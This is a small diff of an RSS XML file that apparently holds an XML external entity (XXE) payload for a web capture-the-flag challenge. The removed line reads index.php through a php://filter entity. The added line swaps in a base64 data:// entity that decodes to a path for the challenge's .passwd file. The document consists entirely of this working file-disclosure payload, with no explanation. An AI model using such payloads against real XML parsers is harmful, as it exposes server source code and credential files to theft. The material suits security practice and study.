@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE replace [<!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php"> ]>
+<!DOCTYPE rss [ <!ENTITY % payload SYSTEM "data://text/plain;base64,ZmlsZTovLy9jaGFsbGVuZ2Uvd2ViLXNlcnZldXIvY2gyOS8ucGFzc3dk"> ]>
+
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page </title>
